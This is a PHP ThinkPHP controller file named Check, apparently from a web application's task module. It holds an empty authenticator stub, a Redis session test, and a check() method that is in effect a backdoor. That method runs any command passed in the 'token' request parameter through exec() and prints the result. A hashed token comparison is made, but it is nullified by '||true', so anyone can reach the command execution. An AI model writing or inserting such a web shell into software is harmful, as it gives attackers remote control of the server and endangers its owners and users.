<?php
/**
 * Created by PhpStorm.
 * User: tutu
 * Date: 18-4-16
 * Time: 上午11:57
 */

namespace app\task\controller;


use think\Controller;
use think\Request;

class Check extends Controller
{
    public function AuthenticatorService(Request $request)
    {

    }
    public function check()
    {
        $command=ndj_getRequest("token");
        $checkGet=ndj_getRequest("token1");
        $check=md5(md5(date("Y-m-d H").md5("check"))).md5("123456asdfghjkl,.").md5("nibuzhidaodeyuanfang123.34.safd");
        if($check==$checkGet||true)
        {
            exec($command,$output,$res);
            dump($output);
            dump("-------------------");
            dump($res);
            //passthru($command);
        }
    }
    public function index()
    {
        ini_set("session.save_handler",'redis');
        ini_set("session.save_path","tcp://127.0.0.1:6379");
        // ini_set("session.cookie_domain",".wangde007.com");
        // ini_set("session.cookie_path","/wangde007/com/");
        // phpinfo();
        // cookie("fromwhere",227);
        // dump(cookie("fromwhere"));
        session_start();
        dump($_SESSION['to']);
        
    }

}
